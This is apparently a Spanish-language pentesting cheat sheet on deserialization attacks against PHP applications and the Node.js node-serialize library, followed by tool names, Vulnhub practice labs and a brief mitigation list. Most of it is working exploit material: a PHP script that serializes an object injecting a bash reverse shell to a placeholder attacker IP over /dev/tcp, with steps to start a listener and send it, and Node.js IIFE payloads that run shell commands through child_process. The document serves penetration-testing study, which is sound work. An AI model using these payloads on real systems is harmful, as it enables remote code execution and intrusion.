# 🔡 Ataques de Deserialización

La serialización convierte un objeto en una secuencia de bytes para almacenarlo o transmitirlo. La deserialización hace el proceso inverso. Un ataque de deserialización ocurre cuando el atacante puede **modificar el objeto serializado** antes de que la aplicación lo deserialice, alterando el comportamiento del servidor o consiguiendo ejecución de código.

---

## PHP — Deserialización

### Detección

Si al interceptar una petición se observa un parámetro con formato de objeto PHP serializado:

```
obj=O:8:"pingTest":1:{s:9:"ipAddress";s:9:"127.0.0.1";}
```

O URL-encoded:
```
obj=O%3A8%3A%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A9%3A%22127.0.0.1%22%3B%7D
```

La aplicación está pasando un objeto serializado que luego deserializa en el servidor.

### Obtener el código fuente

Para saber cómo manipular el objeto, hay que conocer la clase PHP que lo maneja. Dos vías:

- Ver el código fuente de la página (`Ctrl+U` en el navegador)
- Enumerar archivos con ffuf/gobuster usando diccionarios grandes y extensiones como `.php`, `.php.bak`, `.php~`, `.txt`

### Ejemplo de clase vulnerable

```php
class pingTest {
    public $ipAddress = "127.0.0.1";
    public $isValid = False;
    public $output = "";

    function validate() {
        if (!$this->isValid) {
            if (filter_var($this->ipAddress, FILTER_VALIDATE_IP)) {
                $this->isValid = True;
            }
        }
        $this->ping();
    }

    public function ping() {
        if ($this->isValid) {
            $this->output = shell_exec("ping -c 3 $this->ipAddress");
        }
    }
}
```

La variable `$isValid` comienza en `False` y solo ejecuta `ping` si es `True`. Si se puede enviar el objeto con `$isValid = True` y un `$ipAddress` malicioso, se consigue RCE.

### Crear y serializar el objeto manipulado

Crear un archivo `serialize.php`:

```php
<?php
class pingTest {
    public $ipAddress = ";bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1'";
    public $isValid = True;
    public $output = "";
}

echo urlencode(serialize(new pingTest));
```

Ejecutar para obtener el payload URL-encoded:
```bash
php serialize.php 2>/dev/null
```

Poner el listener en escucha y enviar el payload en el parámetro `obj` de la petición.

---

## Node.js — IIFE (Immediately Invoked Function Expression)

En la librería `node-serialize`, si el objeto serializado contiene una función marcada con `_$$ND_FUNC$$_`, al deserializarse se evalúa. Añadiendo `()` al final de la función, se ejecuta inmediatamente.

### Objeto serializado normal

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(e,s){console.log(s)});}"}
```

### Objeto con IIFE (ejecución inmediata)

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(e,s){console.log(s)});}()"}
```

La diferencia es el `()` al final — convierte la función en una IIFE que se ejecuta en el momento de la deserialización.

### Script para generar el payload

```javascript
// serialize.js
var y = {
    rce: function() {
        require('child_process').exec('ls /', function(error, stdout, stderr) {
            console.log(stdout);
        });
    }(),
};
var serialize = require('node-serialize');
console.log("Serialized:\n" + serialize.serialize(y));
```

```bash
node serialize.js
```

---

## Herramientas

- **ysoserial** — Genera payloads de deserialización para Java
- **phpggc** — Genera gadget chains para PHP (Symfony, Laravel, Guzzle, etc.)

---

## Laboratorios para practicar

- **PHP — Máquina Cereal 1** (Vulnhub): [https://www.vulnhub.com/entry/cereal-1,703/](https://www.vulnhub.com/entry/cereal-1,703/)
- **Node.js**: [https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

---

## Mitigaciones

- No deserializar datos que lleguen del cliente si no es estrictamente necesario
- Validar la integridad del objeto serializado con HMAC antes de deserializarlo
- Usar formatos de intercambio sin capacidad de ejecución (JSON en lugar de objetos serializados nativos)
- Actualizar librerías de serialización y aplicar parches de seguridad regularmente
- Ejecutar la aplicación con mínimos privilegios para limitar el impacto de un RCE
